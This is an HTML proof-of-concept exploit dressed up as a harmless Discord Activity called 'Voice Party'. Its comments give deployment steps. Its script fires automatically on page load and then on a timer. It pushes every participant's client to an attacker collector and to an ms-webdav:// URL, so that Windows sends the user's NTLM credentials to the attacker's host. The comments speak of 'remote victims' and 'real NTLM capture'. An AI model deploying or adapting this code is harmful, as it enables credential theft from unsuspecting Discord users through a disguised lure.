<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Voice Party</title>
<!--
  MESSAGE/VC = OWNED — Activity proof of concept.

  HOW TO DEPLOY
  1. Set C2 below to your collector's public host:port
     (local test: 127.0.0.1:8080; remote: your cloudflared/VPS hostname).
  2. In the Discord dev portal for this app, add a URL Mapping for the
     collector host AND for cdn.jsdelivr.net (the SDK import below), then
     publish this file as the Activity's mapped page (e.g. GitHub Pages).
  3. Send https://discord.com/activities/<APP_ID> or start it in a voice
     channel. The page runs inside every participant's Discord client as
     https://<APP_ID>.discordsays.com.

  WHAT IT PROVES
  - Path A (window.open): fires with ZERO clicks/gesture, but ONLY if this
    frame carries allow-popups (Discord grants it to activities whose config
    enables advertisements, or first-party apps). Otherwise Chromium blocks it.
  - Path B (SDK openExternalLink): ALWAYS available to an Activity. Discord
    shows its own confirm dialog ("Trust this Domain" persists per user, so
    repeat sessions fire with no clicks). One in-app click the first time.
  - Either path reaching the collector (check hits.tsv for YOUR nonce) proves
    Discord's main process handed a caller-chosen URL to the OS with only the
    14-scheme deny-list in between — and ms-webdav:// / ldap:// are NOT on it,
    so on Windows the OS authenticates back to C2 with the user's NTLM.
-->
<style>
 html,body{margin:0;height:100%}
 body{background:#0b0c0e;color:#e6e6e6;font:15px/1.55 system-ui,-apple-system,"Segoe UI",sans-serif;
      display:grid;place-items:center;text-align:center}
 .card{width:min(460px,88vw);padding:28px 22px;border-radius:16px;background:#16181d;border:1px solid #23252b}
 h1{margin:0 0 6px;font-size:21px}
 p{margin:0 0 14px;color:#9aa0a6;font-size:14px}
 button{width:100%;background:#5865f2;border:0;color:#fff;padding:13px 18px;border-radius:10px;
        font:600 15px system-ui;cursor:pointer;margin-top:10px}
 button:active{transform:translateY(1px)}
 #log{margin-top:14px;text-align:left;font:12px/1.6 ui-monospace,monospace;color:#c9d1d9;
      background:#0b0c0e;border:1px solid #23252b;border-radius:10px;padding:10px;word-break:break-all;
      max-height:220px;overflow:auto}
 .ok{color:#3ba55d}.bad{color:#ff6b6b}.dim{color:#8b949e}
</style></head>
<body>
<div class="card">
  <h1>Voice Party</h1>
  <p>Join the session</p>
  <div id="log"><span class="dim">booting…</span></div>
  <button id="go">Start session</button>
</div>
<script type="module">
import {DiscordSDK} from 'https://cdn.jsdelivr.net/npm/@discord/embedded-app-sdk@2.5.0/+esm';

// ================= CONFIG =================
const APP_CLIENT_ID = '1562221016007184404'; // <-- your Activity's application id
// C2_BASE: full base URL of YOUR collector, no trailing slash.
//   Local test:  'http://127.0.0.1:8080'
//   Tunnel (remote victims): 'https://<subdomain>.trycloudflare.com'
//   (no :port — Cloudflare terminates TLS on 443)
const C2_BASE = 'https://surely-binding-nam-server.trycloudflare.com';
// CARRIER_HOST: host the *OS-level* carrier URL points at (scheme URLs like
// ms-webdav:// speak plain HTTP on port 80, which a trycloudflare host does
// NOT serve — so for the canary proof use the tunnel host, and for real NTLM
// capture use a VPS/responder reachable on port 80, or test on LAN).
// Local/LAN test: '127.0.0.1:8080'. Tunnel canary-only: leave as C2 host.
const CARRIER_HOST = '127.0.0.1:8080';
const CARRIER = 'ms-webdav';                 // Windows WebClient -> NTLM over HTTP
// ==========================================

const nonce = (Math.random()*1e9|0).toString(36) + '-' + Date.now().toString(36);
const canary = C2_BASE + '/canary?id=' + encodeURIComponent(nonce);
const credUrl = CARRIER + '://' + CARRIER_HOST + '/' + nonce;
const logEl = document.getElementById('log');
function log(t, cls){ const d=document.createElement('div'); if(cls)d.className=cls; d.textContent=t; logEl.appendChild(d); }

// Discord injects ?frame_id= &instance_id= &platform= ONLY when this page runs
// as a real Activity inside the client. Plain browser tab / raw URL = no SDK.
const qs = new URLSearchParams(location.search);
const inDiscord = qs.has('frame_id') && qs.has('instance_id');
log('nonce: ' + nonce, 'dim');
log('context: ' + (inDiscord ? 'inside Discord Activity frame (SDK available)' : 'PLAIN PAGE — open this as an Activity inside Discord, not in a browser'), inDiscord ? 'ok' : 'bad');
let done = false;

async function fireAll(reason){
  log('--- fire (' + reason + ') ---', 'dim');
  // Path A: raw window.open — zero-click IFF frame has allow-popups.
  try {
    const w = window.open(canary, 'EOCECAN');
    log('A window.open(canary): ' + (w ? 'POPUP OBJECT RETURNED (allowed)' : 'blocked (null)'), w ? 'ok' : 'bad');
  } catch(e){ log('A window.open(canary) threw: ' + e, 'bad'); }
  try {
    const w2 = window.open(credUrl, 'EOCECRED');
    log('A window.open(' + CARRIER + '): ' + (w2 ? 'POPUP OBJECT RETURNED (allowed)' : 'blocked (null)'), w2 ? 'ok' : 'bad');
  } catch(e){ log('A window.open(carrier) threw: ' + e, 'bad'); }
  // Path B: official SDK — works only inside Discord's Activity frame.
  if (!inDiscord){ log('B skipped: not in an Activity frame (no frame_id). Launch via Discord, see steps below.', 'bad'); return; }
  try {
    const sdk = new DiscordSDK(APP_CLIENT_ID);
    await sdk.ready();
    log('B sdk.ready(): ok', 'ok');
    const r = await sdk.commands.openExternalLink({url: canary});
    log('B openExternalLink(canary): opened=' + (r && r.opened), (r && r.opened) ? 'ok' : 'bad');
    if (r && r.opened && !done){ done = true; log('CHECK COLLECTOR hits.tsv FOR NONCE ' + nonce, 'ok'); }
  } catch(e){ log('B SDK path error: ' + (e && e.message ? e.message : e), 'bad'); }
}

fireAll('on-load (zero clicks so far)');
setTimeout(()=>fireAll('t+1.5s (late-join beat)'), 1500);
document.getElementById('go').addEventListener('click', ()=>fireAll('button click (user activation)'));
</script>
</body></html>
